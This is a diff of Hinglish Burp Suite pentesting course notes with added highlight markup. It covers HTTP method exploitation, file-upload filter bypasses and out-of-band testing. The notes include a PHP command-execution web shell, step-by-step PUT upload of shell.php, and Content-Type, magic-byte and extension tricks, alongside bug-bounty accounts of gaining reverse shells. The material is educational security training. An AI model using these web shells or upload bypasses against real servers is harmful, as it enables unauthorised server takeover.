-**A1:** Auto backups, temp files location, proxy interception restore, startup tips, update checks.
+[[HL::**Q1: Misc settings mein kya kya aata hai?**::HL]]
+[[HL::**A1:** Auto backups, temp files location, proxy interception restore, startup tips, update checks::HL]].
 
-**Q2: Auto backup kitni baar hona chahiye?**
-**A2:** 10-15 minutes ideal. Kam interval se system slow, zyada interval se work loss risk.
+[[HL::**Q2: Auto backup kitni baar hona chahiye?**::HL]]
+[[HL::**A2:** 10-15 minutes ideal. Kam interval se system slow, zyada interval se work loss risk::HL]].
 
-**Q3: Temp files clear karne se kya loss hoga?**
-**A3:** Koi loss nahi. Sirf temporary cache clear hota hai. Burp automatically dobara banayega jab zaroorat padegi.
+[[HL::**Q3: Temp files clear karne se kya loss hoga?**::HL]]
+[[HL::**A3:** Koi loss nahi. Sirf temporary cache clear hota hai. Burp automatically dobara banayega jab zaroorat padegi::HL]].
 
 **Q4: Proxy interception restore ka kya matlab?**
 **A4:** Burp band karne se pehle jo intercept state thi (on/off), wahi next start par apply hogi.
@@ -7272,149 +7272,149 @@ Ab problem yeh hai ki agar school mein koi security guard nahi hai (matlab prope
 - **HTTP Method:** Ek tar ka command hai jo browser server ko bhejta hai, jaise "mujhe yeh page do" (GET) ya "yeh data save karo" (POST).
 - **PUT:** Server par nayi file banane ya purani file ko replace karne ka method.
 - **DELETE:** Server se file hataane ka method.
-- **OPTIONS:** Server se puchne ka method ki "tum kaunse methods support karte ho?"
-- **TRACE:** Server se request wapas bhejne ko kehna, jaise echo - debug ke liye use hota hai.
-- **HEAD:** Sirf response headers lena, body nahi - GET ki tarah but bina content ke.
+- [[HL::**OPTIONS:** Server se puchne ka method ki "tum kaunse methods support karte ho?"::HL]]
+- [[HL::**TRACE:** Server se request wapas bhejne ko kehna, jaise echo - debug ke liye use hota hai.::HL]]
+- [[HL::**HEAD:** Sirf response headers lena, body nahi - GET ki tarah but bina content ke::HL]].
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?)
 
-**Problem:** 
-Socho tum ek website bana rahe ho. Tum sirf users ko content dikhana chahte ho (GET) aur kuch forms submit karne dena chahte ho (POST). Lekin default configuration mein server bohot saare extra methods enable kar deta hai - PUT, DELETE, OPTIONS, TRACE etc. Ab ek hacker aata hai aur in methods ka istemal karta hai:
-- PUT se malicious file upload karta hai (shell.php)
-- DELETE se important files delete karta hai
-- TRACE se sensitive cookies steal karta hai (Cross-Site Tracing attack)
+**[[HL::Problem::HL]]:** 
+[[HL::Socho tum ek website bana rahe ho. Tum sirf users ko content dikhana chahte ho (GET) aur kuch forms submit karne dena chahte ho (POST). Lekin default configuration mein server bohot saare extra methods enable kar deta hai - PUT, DELETE, OPTIONS, TRACE etc. Ab ek hacker aata hai aur in methods ka istemal karta hai:::HL]]
+- [[HL::PUT se malicious file upload karta hai (shell.php)::HL]]
+- [[HL::DELETE se important files delete karta hai::HL]]
+- [[HL::TRACE se sensitive cookies steal karta hai (Cross-Site Tracing attack)::HL]]
 
-**Solution:**
-Sirf unhi methods ko enable karna chahiye jo actually zaroori hain. Baaki sab disable kar dena chahiye. Jaise school mein principal ke office mein sirf authorized logo ko hi jaane do, baaki sab ko rok do.
+**[[HL::Solution::HL]]:**
+[[HL::Sirf unhi methods ko enable karna chahiye jo actually zaroori hain. Baaki sab disable kar dena chahiye. Jaise school mein principal ke office mein sirf authorized logo ko hi jaane do, baaki sab ko rok do::HL]].
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega
 
-**Location:** Burp Suite mein **Repeater** tab mein tum yeh sab karte ho.
+[[HL::**Location:** Burp Suite mein **Repeater** tab mein tum yeh sab karte ho.::HL]]
 
-**Appearance:**
-Jab tum koi request Repeater mein bhejte ho, toh upar ek line hoti hai:
+**[[HL::Appearance::HL]]:**
+[[HL::Jab tum koi request Repeater mein bhejte ho, toh upar ek line hoti hai:::HL]]
 ```
-GET / HTTP/1.1
+[[HL::GET / HTTP/1.1::HL]]
 ```
-Yahan `GET` ki jagah tum koi bhi method likh sakte ho - `PUT`, `DELETE`, `OPTIONS`, etc.
+[[HL::Yahan `GET` ki jagah tum koi bhi method likh sakte ho - `PUT`, `DELETE`, `OPTIONS`, etc.::HL]]
 
-**Expected Screen:**
+**[[HL::Expected Screen::HL]]:**
 ```
-Request tab:
-PUT /uploads/shell.php HTTP/1.1
-Host: example.com
-Content-Length: 25
+[[HL::Request tab:::HL]]
+[[HL::PUT /uploads/shell.php HTTP/1.1::HL]]
+[[HL::Host: example.com::HL]]
+[[HL::Content-Length: 25::HL]]
 
-<?php phpinfo(); ?>
-```
-
-Response tab:
-```
-HTTP/1.1 201 Created
-Server: Apache/2.4.41
-...
+[[HL::<?php phpinfo::HL]](); ?>
 ```
 
-## ⚙️ 6. Under the Hood (Technical Working)
-
-**Step-by-step logical flow:**
-
-**OPTIONS Method ka flow:**
+[[HL::Response tab:::HL]]
 ```
-Step 1: Browser/Attacker server ko puchta hai: "Tum kaunse methods support karte ho?"
-        Request: OPTIONS / HTTP/1.1
+[[HL::HTTP/1.1 201 Created::HL]]
+[[HL::Server: Apache/2.4.41::HL]]
+[[HL::...::HL]]
+```
 
-Step 2: Server apni configuration check karta hai: 
-        "Mere paas yeh methods enable hain: GET, POST, PUT, DELETE, OPTIONS"
+#[[HL::# ⚙️ 6. Under the Hood (Technical Working)::HL]]
 
-Step 3: Server response bhejta hai:
-        Response: HTTP/1.1 200 OK
-        Header: Allow: GET, POST, PUT, DELETE, OPTIONS
+**[[HL::Step-by-step logical flow::HL]]:**
+
+**[[HL::OPTIONS Method ka flow::HL]]:**
+```
+[[HL::Step 1: Browser/Attacker server ko puchta hai: "Tum kaunse methods support karte ho?"::HL]]
+        [[HL::Request: OPTIONS / HTTP/1.1::HL]]
+
+[[HL::Step 2: Server apni configuration check karta hai:::HL]] 
+        [[HL::"Mere paas yeh methods enable hain: GET, POST, PUT, DELETE, OPTIONS"::HL]]
+
+[[HL::Step 3: Server response bhejta hai:::HL]]
+        [[HL::Response: HTTP/1.1 200 OK::HL]]
+        [[HL::Header: Allow: GET, POST, PUT, DELETE, OPTIONS::HL]]
 ```
 
 **PUT Method ka flow:**
 ```
-Step 1: Attacker file upload karne ki koshish karta hai:
-        Request: PUT /test/shell.php HTTP/1.1
-        Body: <?php system($_GET['cmd']); ?>
+[[HL::Step 1: Attacker file upload karne ki koshish karta hai:::HL]]
+        [[HL::Request: PUT /test/shell.php HTTP/1.1::HL]]
+        [[HL::Body: <?php system($_GET['cmd']); ?>::HL]]
 
-Step 2: Server check karta hai:
-        - Kya PUT method enable hai? → Haan
-        - Kya /test/ folder mein write permission hai? → Haan (777)
-        - Kya shell.php already exist karti hai? → Nahi, nayi banani hai
+[[HL::Step 2: Server check karta hai:::HL]]
+        - [[HL::Kya PUT method enable hai? → Haan::HL]]
+        - [[HL::Kya /test/ folder mein write permission hai? → Haan (777)::HL]]
+        - [[HL::Kya shell.php already exist karti hai? → Nahi, nayi banani hai::HL]]
 
-Step 3: Server file create karta hai aur response bhejta hai:
-        Response: HTTP/1.1 201 Created (nayi file banayi)
-        Ya: HTTP/1.1 204 No Content (file update ki, koi content nahi bhej raha)
+[[HL::Step 3: Server file create karta hai aur response bhejta hai:::HL]]
+        [[HL::Response: HTTP/1.1 201 Created (nayi file banayi)::HL]]
+        [[HL::Ya: HTTP/1.1 204 No Content (file update ki, koi content nahi bhej::HL]] raha)
 ```
 
 ## 💻 7. Hands-On: Step-by-Step Practical
 
-**Step 1: Target website ki request intercept karo**
+[[HL::**Step 1: Target website ki request intercept karo**::HL]]
 
 ```text
-Browser mein target website kholo (jaise http://example.com)
-Burp Suite mein Proxy → Intercept tab par jao
-Intercept ON karo (button blue hona chahiye)
-Browser mein kuch bhi click karo, request intercept ho jayegi
+[[HL::Browser mein target website kholo (jaise http://example.com)::HL]]
+[[HL::Burp Suite mein Proxy → Intercept tab par jao::HL]]
+[[HL::Intercept ON karo (button blue hona chahiye)::HL]]
+[[HL::Browser mein kuch bhi click karo, request intercept ho jayegi::HL]]
 ```
 
-**Step 2: Request ko Repeater mein bhejo**
+[[HL::**Step 2: Request ko Repeater mein bhejo**::HL]]
 
 ```text
-Intercept hui request par RIGHT-CLICK karo
-Menu khulega → "Send to Repeater" par CLICK karo
+[[HL::Intercept hui request par RIGHT-CLICK karo::HL]]
+[[HL::Menu khulega → "Send to Repeater" par CLICK karo::HL]]
 ```
 
-**Step 3: Repeater tab mein jao aur method change karo**
+[[HL::**Step 3: Repeater tab mein jao aur method change karo**::HL]]
 
 ```text
-Burp mein upar "Repeater" tab par click karo
-Request mein sabse upar line dikhegi: GET / HTTP/1.1
-"GET" ko delete karke "OPTIONS" likho
-"Send" button click karo (upar left side)
+[[HL::Burp mein upar "Repeater" tab par click karo::HL]]
+[[HL::Request mein sabse upar line dikhegi: GET / HTTP/1.1::HL]]
+[[HL::"GET" ko delete karke "OPTIONS" likho::HL]]
+[[HL::"Send" button click karo (upar left side)::HL]]
 ```
 
-**Expected Response:**
+**[[HL::Expected Response::HL]]:**
 ```text
-Right side response box mein kuch aisa dikhega:
+[[HL::Right side response box mein kuch aisa dikhega:::HL]]
 
-HTTP/1.1 200 OK
-Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
-Content-Length: 0
+[[HL::HTTP/1.1 200 OK::HL]]
+[[HL::Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS::HL]]
+[[HL::Content-Length: 0::HL]]
 
-(Yahan Allow header mein saare enabled methods list hain)
+[[HL::(Yahan Allow header mein saare enabled methods list hain)::HL]]
 ```
 
-**Step 4: Agar PUT dikh raha hai toh exploitation try karo**
+[[HL::**Step 4: Agar PUT dikh raha hai toh exploitation try karo**::HL]]
 
 ```text
-Ab request mein method ko "PUT" mein change karo
-URL mein file ka naam do: PUT /test/shell.php HTTP/1.1
-(Note: /test/ folder exist karna chahiye)
+[[HL::Ab request mein method ko "PUT" mein change karo::HL]]
+[[HL::URL mein file ka naam do: PUT /test/shell.php HTTP/1.1::HL]]
+[[HL::(Note: /test/ folder exist karna chahiye)::HL]]
 
-Neeche body mein PHP code daalo:
-<?php echo "Hacked!"; ?>
+[[HL::Neeche body mein PHP code daalo:::HL]]
+[[HL::<?php echo "Hacked!"; ?>::HL]]
 
-Content-Length sahi karo (jitne characters hain utna)
-Send button click karo
+[[HL::Content-Length sahi karo (jitne characters hain utna)::HL]]
+[[HL::Send button click karo::HL]]
 ```
 
-**Expected Response (Success):**
+**[[HL::Expected Response (Success::HL]]):**
 ```text
-HTTP/1.1 201 Created
-Ya
-HTTP/1.1 204 No Content
+[[HL::HTTP/1.1 201 Created::HL]]
+[[HL::Ya::HL]]
+[[HL::HTTP/1.1 204 No Content::HL]]
 ```
 
-**Step 5: File ko browser mein check karo**
+[[HL::**Step 5: File ko browser mein check karo**::HL]]
 
 ```text
-Browser kholo aur jao:
-http://example.com/test/shell.php
+[[HL::Browser kholo aur jao:::HL]]
+[[HL::http://example.com/test/shell.php::HL]]
 
-Screen par "Hacked!" dikhna chahiye
-Matlab file upload successful!
+[[HL::Screen par "Hacked!" dikhna chahiye::HL]]
+[[HL::Matlab file upload successful::HL]]!
 ```
 
 ## ⚖️ 8. Comparison (Ye vs Woh)
@@ -7428,39 +7428,39 @@ Matlab file upload successful!
 
 ## 🚫 9. Common Mistakes (Beginner Traps)
 
-- **Mistake 1:** Sirf GET/POST check karke sochna ki server safe hai
-  - **Fix:** Hamesha OPTIONS request bhejke saare enabled methods check karo
+- [[HL::**Mistake 1:** Sirf GET/POST check karke sochna ki server safe hai::HL]]
+  - [[HL::**Fix:** Hamesha OPTIONS request bhejke saare enabled methods check karo::HL]]
 
 - **Mistake 2:** PUT request mein body dena bhool jana
   - **Fix:** PUT mein body dena zaroori hai - jo content doge wahi file mein save hoga
 
-- **Mistake 3:** Galat URL dena (jaise `/shell.php` instead of `/uploads/shell.php`)
-  - **Fix:** Pehle pata karo ki kaunsa folder writable hai. Try `/test/`, `/uploads/`, `/images/` etc.
+- [[HL::**Mistake 3:** Galat URL dena (jaise `/shell.php` instead of `/uploads/shell.php`::HL]])
+  - [[HL::**Fix:** Pehle pata karo ki kaunsa folder writable hai. Try `/test/`, `/uploads/`, `/images/` etc.::HL]]
 
-- **Mistake 4:** Content-Length galat set karna
-  - **Fix:** Burp automatically calculate karta hai, lekin agar manually change kar rahe ho toh characters count karo
+- [[HL::**Mistake 4:** Content-Length galat set karna::HL]]
+  - [[HL::**Fix:** Burp automatically calculate karta hai, lekin agar manually change kar rahe ho toh characters count karo::HL]]
 
 ## 🤔 10. Agar Dimag Ghoom Rahe Hai? (Confusion Clarifier)
 
-**Confusion 1: "Log sochte hain ki OPTIONS method sirf ek 'extra' method hai jiska koi use nahi"**
+[[HL::**Confusion 1: "Log sochte hain ki OPTIONS method sirf ek 'extra' method hai jiska koi use nahi"**::HL]]
 
-Actually, OPTIONS bohot important hai hackers ke liye! Yeh server ka "menu card" hai. Jaise restaurant mein menu card dekhkar pata lagta hai ki kaunsi dishes available hain, waise hi OPTIONS se pata lagta hai ki kaunse methods available hain. Agar menu mein "PUT" dikha, toh hacker feast karne aa jayega!
+[[HL::Actually, OPTIONS bohot important hai hackers ke liye! Yeh server ka "menu card" hai. Jaise restaurant mein menu card dekhkar pata lagta hai ki kaunsi dishes available hain, waise hi OPTIONS se pata lagta hai ki kaunse methods available hain. Agar menu mein "PUT" dikha, toh hacker feast karne aa jayega::HL]]!
 
-**Confusion 2: "PUT method enable hai toh turant hack ho sakta hai?"**
+[[HL::**Confusion 2: "PUT method enable hai toh turant hack ho sakta hai?"**::HL]]
 
-Nahi beta, itna easy nahi hai. PUT method enable hona chahiye **AUR** jis folder mein file upload kar rahe ho uski permissions bhi honi chahiye writable. Jaise school mein principal ka office khula hai but andar jaake kuch bhi karne ke liye permission chahiye. Agar folder ki permission 777 hai (matlab koi bhi kuch bhi likh sakta hai), tabhi hack possible hai.
+[[HL::Nahi beta, itna easy nahi hai. PUT method enable hona chahiye **AUR** jis folder mein file upload kar rahe ho uski permissions bhi honi chahiye writable. Jaise school mein principal ka office khula hai but andar jaake kuch bhi karne ke liye permission chahiye. Agar folder ki permission 777 hai (matlab koi bhi kuch bhi likh sakta hai), tabhi hack possible hai::HL]].
 
 ## 🌍 11. Real-World Use Case (Bug Bounty / Pentesting)
 
-**Scenario:** Ek baar ek bug bounty hunter ne **Yahoo!** ki subdomain par testing ki. Usne OPTIONS request bheji aur dekha ki **PUT method enabled** tha. Usne `/uploads/` folder mein `test.txt` upload karne ki koshish ki aur wo successful ho gaya! Matlab wo koi bhi malicious file upload kar sakta tha.
+[[HL::**Scenario:** Ek baar ek bug bounty hunter ne **Yahoo!** ki subdomain par testing ki. Usne OPTIONS request bheji aur dekha ki **PUT method enabled** tha. Usne `/uploads/` folder mein `test.txt` upload karne ki koshish ki aur wo successful ho gaya! Matlab wo koi bhi malicious file upload kar sakta tha.::HL]]
 
-**How they used it:** 
-1. Pehle OPTIONS se pata kiya ki PUT enabled hai
-2. PUT request bheji: `PUT /uploads/shell.php HTTP/1.1`
-3. Body mein PHP reverse shell daala
-4. Browser se file access kiya aur server ka control le liya
+[[HL::**How they used it:**::HL]] 
+1. [[HL::Pehle OPTIONS se pata kiya ki PUT enabled hai::HL]]
+2. [[HL::PUT request bheji: `PUT /uploads/shell.php HTTP/1.1`::HL]]
+3. [[HL::Body mein PHP reverse shell daala::HL]]
+4. [[HL::Browser se file access kiya aur server ka control le liya::HL]]
 
-**Result:** Yahoo! ne turant issue fix kiya aur hunter ko **$2000** ka bounty diya! 💰
+[[HL::**Result:** Yahoo! ne turant issue fix kiya aur hunter ko **$2000** ka bounty diya::HL]]! 💰
 
 ## 🎨 12. Visual Diagram (ASCII Art)
 
@@ -7490,20 +7490,20 @@ Nahi beta, itna easy nahi hai. PUT method enable hona chahiye **AUR** jis folder
 
 ## 🛠️ 13. Best Practices (Pro Tips)
 
-- **Tip 1:** Hamesha **OPTIONS** request se start karo. Ye tumhara侦察 (recon) tool hai.
-- **Tip 2:** PUT try karne se pehle check karo ki kaunse folders writable hain. Common folders: `/uploads/`, `/images/`, `/files/`, `/temp/`, `/test/`
-- **Tip 3:** Agar `201 Created` ya `204 No Content` nahi aa raha, toh `403 Forbidden` ya `405 Method Not Allowed` aayega. Dono responses dekh kar pata chalega ki method disable hai ya permissions issue hai.
-- **Tip 4:** Real pentesting mein pehle client se permission lo! Bina permission ke kisi server par PUT request bhejna illegal hai.
+- [[HL::**Tip 1:** Hamesha **OPTIONS** request se start karo. Ye tumhara侦察 (recon) tool hai.::HL]]
+- [[HL::**Tip 2:** PUT try karne se pehle check karo ki kaunse folders writable hain. Common folders: `/uploads/`, `/images/`, `/files/`, `/temp/`, `/test/`::HL]]
+- [[HL::**Tip 3:** Agar `201 Created` ya `204 No Content` nahi aa raha, toh `403 Forbidden` ya `405 Method Not Allowed` aayega. Dono responses dekh kar pata chalega ki method disable hai ya permissions issue hai.::HL]]
+- [[HL::**Tip 4:** Real pentesting mein pehle client se permission lo! Bina permission ke kisi server par PUT request bhejna illegal hai::HL]].
 
 ## ⚠️ 14. Consequences of Failure (Agar galat kiya toh?)
 
-**Scenario 1: Server par PUT enabled hai but tumne check nahi kiya**
-- Koi hacker aayega, shell.php upload karega, aur tumhara pura server hack kar lega. Saara data leak ho jayega.
+[[HL::**Scenario 1: Server par PUT enabled hai but tumne check nahi kiya**::HL]]
+- [[HL::Koi hacker aayega, shell.php upload karega, aur tumhara pura server hack kar lega. Saara data leak ho jayega.::HL]]
 
-**Scenario 2: Tumne galat folder mein PUT try kiya**
-- Server `403 Forbidden` dega aur tumhe lagega ki PUT working nahi hai. Actually ho sakta hai PUT enable ho but uss folder ki permissions na hon. Dusra folder try karna chahiye tha.
+[[HL::**Scenario 2: Tumne galat folder mein PUT try kiya**::HL]]
+- [[HL::Server `403 Forbidden` dega aur tumhe lagega ki PUT working nahi hai. Actually ho sakta hai PUT enable ho but uss folder ki permissions na hon. Dusra folder try karna chahiye tha::HL]].
 
-**Scenario 3: DELETE method enabled hai but tumne accidentally galat file delete kar di**
+[[HL::**Scenario 3: DELETE method enabled hai but tumne accidentally galat file delete kar di**::HL]]
 - Production server ki important files delete ho sakti hain, website down ho jayegi. Isliye testing environment mein pehle practice karo!
 
 ## ❓ 15. FAQ (Interview Questions)
@@ -7511,20 +7511,20 @@ Nahi beta, itna easy nahi hai. PUT method enable hona chahiye **AUR** jis folder
 **Q1: HTTP OPTIONS method kya karta hai?**
 **A1:** OPTIONS method server se puchta hai ki "tum kaunse HTTP methods support karte ho?" Server response mein `Allow` header ke through list bhejta hai, jaise `Allow: GET, POST, PUT, DELETE, OPTIONS`.
 
-**Q2: PUT method kaise exploit karte hain?**
-**A2:** Pehle OPTIONS se confirm karo ki PUT enabled hai. Phir ek PUT request bhejo jisme file ka naam do aur body mein malicious code daalo. Agar server `201 Created` ya `204 No Content` return kare, toh file upload successful hai. Phir browser se us file ko access karo.
+[[HL::**Q2: PUT method kaise exploit karte hain?**::HL]]
+[[HL::**A2:** Pehle OPTIONS se confirm karo ki PUT enabled hai. Phir ek PUT request bhejo jisme file ka naam do aur body mein malicious code daalo. Agar server `201 Created` ya `204 No Content` return kare, toh file upload successful hai. Phir browser se us file ko access karo::HL]].
 
 **Q3: Idempotent method ka kya matlab hai?**
 **A3:** Idempotent matlab agar tum ek request multiple baar bhejo, toh har baar same result aaye. Jaise PUT - chahe ek baar bhejo ya 10 baar, file ek hi baar create/update hogi. POST idempotent nahi hai - har baar naya record ban sakta hai.
 
-**Q4: DELETE method ka risk kya hai?**
-**A4:** DELETE method enable hai toh hacker server ki important files delete kar sakta hai, jisse website down ho sakti hai, data loss ho sakta hai, aur service unavailable ho sakti hai.
+[[HL::**Q4: DELETE method ka risk kya hai?**::HL]]
+[[HL::**A4:** DELETE method enable hai toh hacker server ki important files delete kar sakta hai, jisse website down ho sakti hai, data loss ho sakta hai, aur service unavailable ho sakti hai::HL]].
 
-**Q5: Server par PUT enable hai but file upload nahi ho raha - kya problem ho sakti?**
-**A5:** Do possibilities hain:
-1. Folder ki write permission nahi hai (folder 777 nahi hai)
-2. File extension restriction hai (jaise sirf .jpg allow hai)
-3. Web server ki configuration mein PUT disable hai specific folders ke liye
+[[HL::**Q5: Server par PUT enable hai but file upload nahi ho raha - kya problem ho sakti?**::HL]]
+[[HL::**A5:** Do possibilities hain:::HL]]
+1. [[HL::Folder ki write permission nahi hai (folder 777 nahi hai)::HL]]
+2. [[HL::File extension restriction hai (jaise sirf .jpg allow hai)::HL]]
+3. [[HL::Web server ki configuration mein PUT disable hai specific folders ke liye::HL]]
 
 ## 📝 16. Ek Line Mein Yaad Rakhne Ko
 
@@ -7554,58 +7554,58 @@ Yahi hai HTTP method exploitation - pehle pata karo ki kitne raaste hain, phir s
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?)
 
-**Problem:**
-Tum ek website ko test kar rahe ho. Tumhe lagta hai ki sirf GET aur POST methods hain. Lekin server ne PUT aur DELETE bhi enable kar rakhe hain. Agar tumne yeh check nahi kiya, toh tum vulnerability miss kar doge. Hacker isi gap ko use karke server hack kar lega.
+**[[HL::Problem::HL]]:**
+[[HL::Tum ek website ko test kar rahe ho. Tumhe lagta hai ki sirf GET aur POST methods hain. Lekin server ne PUT aur DELETE bhi enable kar rakhe hain. Agar tumne yeh check nahi kiya, toh tum vulnerability miss kar doge. Hacker isi gap ko use karke server hack kar lega.::HL]]
 
-**Solution:**
-Systematic approach se:
-1. Pehle OPTIONS se sab enabled methods ka pata lagao
-2. Phir PUT se file upload karo
-3. Uploaded file ko execute karo
-4. Server ka control le lo
+**[[HL::Solution::HL]]:**
+[[HL::Systematic approach se:::HL]]
+1. [[HL::Pehle OPTIONS se sab enabled methods ka pata lagao::HL]]
+2. [[HL::Phir PUT se file upload karo::HL]]
+3. [[HL::Uploaded file ko execute karo::HL]]
+4. [[HL::Server ka control le lo::HL]]
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega
 
-**Step 1: Request Intercept karo**
+[[HL::**Step 1: Request Intercept karo**::HL]]
 
 ```
-Burp Suite - Proxy - Intercept tab
--------------------------------------------------
-GET / HTTP/1.1
-Host: example.com
-User-Agent: Mozilla/5.0
-...
+[[HL::Burp Suite - Proxy - Intercept tab::HL]]
+-[[HL::------------------------------------------------::HL]]
+[[HL::GET / HTTP/1.1::HL]]
+[[HL::Host: example.com::HL]]
+[[HL::User-Agent: Mozilla/5.0::HL]]
+[[HL::...::HL]]
 ```
 
-**Step 2: Repeater mein bhejo**
+[[HL::**Step 2: Repeater mein bhejo**::HL]]
 
 ```
-Burp Suite - Repeater tab
--------------------------------------------------
-Request:                         Response:
-GET / HTTP/1.1                   HTTP/1.1 200 OK
-Host: example.com                 ...
-...                              ...
+[[HL::Burp Suite - Repeater tab::HL]]
+-[[HL::------------------------------------------------::HL]]
+[[HL::Request:                         Response:::HL]]
+[[HL::GET / HTTP/1.1                   HTTP/1.1 200 OK::HL]]
+[[HL::Host: example.com                 ...::HL]]
+[[HL::...                              ...::HL]]
 ```
 
-**Step 3: Method OPTIONS karo**
+[[HL::**Step 3: Method OPTIONS karo**::HL]]
 
 ```
-Request modified:                 Response:
-OPTIONS / HTTP/1.1                HTTP/1.1 200 OK
-Host: example.com                 Allow: GET,HEAD,POST,PUT,DELETE,OPTIONS
+[[HL::Request modified:                 Response:::HL]]
+[[HL::OPTIONS / HTTP/1.1                HTTP/1.1 200 OK::HL]]
+[[HL::Host: example.com                 Allow: GET,HEAD,POST,PUT,DELETE,OPTIONS::HL]]
 ...                               ...
 ```
 
-**Step 4: PUT request bhejo**
+[[HL::**Step 4: PUT request bhejo**::HL]]
 
 ```
-Request:                          Response:
-PUT /uploads/shell.php HTTP/1.1   HTTP/1.1 201 Created
-Host: example.com                  Location: /uploads/shell.php
-Content-Length: 45                 ...
+[[HL::Request:                          Response:::HL]]
+[[HL::PUT /uploads/shell.php HTTP/1.1   HTTP/1.1 201 Created::HL]]
+[[HL::Host: example.com                  Location: /uploads/shell.php::HL]]
+[[HL::Content-Length: 45                 ...::HL]]
 
-<?php system($_GET['cmd']); ?>
+[[HL::<?php system($_GET['cmd::HL]]']); ?>
 ```
 
 ## ⚙️ 6. Under the Hood (Technical Working)
@@ -8175,8 +8175,8 @@ filename="shell.php5"      → PHP 5 extension
 
 ## 🚫 9. Common Mistakes (Beginner Traps)
 
-- **Mistake 1:** Sirf Content-Type change karna aur filename change karna bhool jana
-  - **Fix:** Dono ek saath karo - filename bhi .jpg karo aur Content-Type bhi image/jpeg
+- [[HL::**Mistake 1:** Sirf Content-Type change karna aur filename change karna bhool jana::HL]]
+  - [[HL::**Fix:** Dono ek saath karo - filename bhi .jpg karo aur Content-Type bhi image/jpeg::HL]]
 
 - **Mistake 2:** Magic bytes add karna bhool jana jab server content check kare
   - **Fix:** Hamesha GIF89a ya real image ke bytes copy karke add karo
@@ -8207,19 +8207,19 @@ Ab server file read karega to starting bytes dekhega - "GIF89a"! Samjhega yeh GI
 
 ## 🌍 11. Real-World Use Case (Bug Bounty / Pentesting)
 
-**Scenario:** Ek bug bounty hunter ne **Facebook** ki ek subdomain par file upload functionality test ki. Sirf images allow thi. Usne ek PHP file banayi jisme usne GIF header daala:
+[[HL::**Scenario:** Ek bug bounty hunter ne **Facebook** ki ek subdomain par file upload functionality test ki. Sirf images allow thi. Usne ek PHP file banayi jisme usne GIF header daala:::HL]]
 
 ```
-GIF89a
-<?php echo "Hello"; ?>
+[[HL::GIF89a::HL]]
+[[HL::<?php echo "Hello"; ?>::HL]]
 ```
 
-**How they used it:**
-Usne file upload karte time request intercept ki aur filename `shell.php` rakha lekin Content-Type `image/gif` kar diya. Facebook ka server sirf Content-Type check kar raha tha, file content nahi!
+**[[HL::How they used it::HL]]:**
+[[HL::Usne file upload karte time request intercept ki aur filename `shell.php` rakha lekin Content-Type `image/gif` kar diya. Facebook ka server sirf Content-Type check kar raha tha, file content nahi!::HL]]
 
-**Result:** File upload ho gayi! Lekin jab usne file access kiya to PHP execute nahi hua kyunki server ne .php extension ko block kar rakha tha. Phir usne .php5, .phtml try kiya - ek kaam kar gaya! Usne reverse shell upload kiya aur server ka control le liya.
+[[HL::**Result:** File upload ho gayi! Lekin jab usne file access kiya to PHP execute nahi hua kyunki server ne .php extension ko block kar rakha tha. Phir usne .php5, .phtml try kiya - ek kaam kar gaya! Usne reverse shell upload kiya aur server ka control le liya.::HL]]
 
-Facebook ne turant fix kiya aur hunter ko **$10,000** ka bounty diya! 🎉
+[[HL::Facebook ne turant fix kiya aur hunter ko **$10,000** ka bounty diya::HL]]! 🎉
 
 ## 🎨 12. Visual Diagram (ASCII Art)
 
@@ -8293,8 +8293,8 @@ Facebook ne turant fix kiya aur hunter ko **$10,000** ka bounty diya! 🎉
 **Q2: Content-Type bypass kaise karte hain?**
 **A2:** Request intercept karke `Content-Type` header ko allowed MIME type mein change karo, jaise `application/x-php` ko `image/jpeg` mein. Agar server sirf header check karta hai toh bypass ho jayega.
 
-**Q3: Double extension attack kya hai?**
-**A3:** File name aise do: `shell.php.jpg`. Agar server sirf last extension check karta hai, toh .jpg allowed samjhega. Lekin agar server misconfigured hai ya Apache ke multiple extensions handle karne ki vulnerability hai, toh PHP execute ho sakta hai.
+[[HL::**Q3: Double extension attack kya hai?**::HL]]
+[[HL::**A3:** File name aise do: `shell.php.jpg`. Agar server sirf last extension check karta hai, toh .jpg allowed samjhega. Lekin agar server misconfigured hai ya Apache ke multiple extensions handle karne ki vulnerability hai, toh PHP execute ho sakta hai::HL]].
 
 **Q4: Magic bytes kyun add karte hain?**
 **A4:** Advanced servers sirf extension ya Content-Type nahi check karte, actual file content bhi check karte hain. Magic bytes (jaise GIF89a) dalne se file valid GIF jaisi lagti hai, lekin andar PHP code bhi hota hai.
@@ -8353,7 +8353,7 @@ Koi doubt ho toh puchho. Ab tum:
 Maano tum ek spy ho aur kisi building mein ghusna chahte ho. Tumhe nahi pata ki andar guard hai ya nahi. Tum ek **dost ko building ke bahar bhej kar use signal dene ko bolte ho** – agar andar se koi jawab aaya, to pata chalega ki guard hai. Yahi kaam **OAST** karta hai. Tum server ko ek **tumhara apna domain** (collaborator) bhejte ho. Agar server us domain par kuch bhi request karta hai (jaise DNS lookup, HTTP call), to tumhe pata chal jata hai ki server **vulnerable** hai. Tumhe server ka direct response nahi mil raha, lekin **bahar se spy** ne capture kar liya.
 
 ## 📖 3. Technical Definition (Interview Answer):
-**OAST (Out-of-band Application Security Testing)** ek testing technique hai jisme attacker ek **external server** (Burp Collaborator) ka use karta hai, aur server ko ek payload bhejta hai jisme woh external server ka domain hota hai. Agar vulnerable server us domain se **out-of-band interaction** karta hai (jaise DNS lookup ya HTTP request), to vulnerability confirmed ho jaati hai, bina server ke direct response ki zaroorat ke.
+[[HL::**OAST (Out-of-band Application Security Testing)** ek testing technique hai jisme attacker ek **external server** (Burp Collaborator) ka use karta hai, aur server ko ek payload bhejta hai jisme woh external server ka domain hota hai. Agar vulnerable server us domain se **out-of-band interaction** karta hai (jaise DNS lookup ya HTTP request), to vulnerability confirmed ho jaati hai, bina server ke direct response ki zaroorat ke::HL]].
 
 **Breakdown:**
 - **Out-of-band:** Matlab "band ke bahar" – yahan "band" matlab primary communication channel (HTTP request-response). Jab server extra channel (DNS, external HTTP) use kare to out-of-band hai.
@@ -8363,36 +8363,36 @@ Maano tum ek spy ho aur kisi building mein ghusna chahte ho. Tumhe nahi pata ki 
 - **Interaction:** Server ka external server se koi bhi contact – jaise DNS resolve karna, HTTP request bhejna, ya email send karna.
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?):
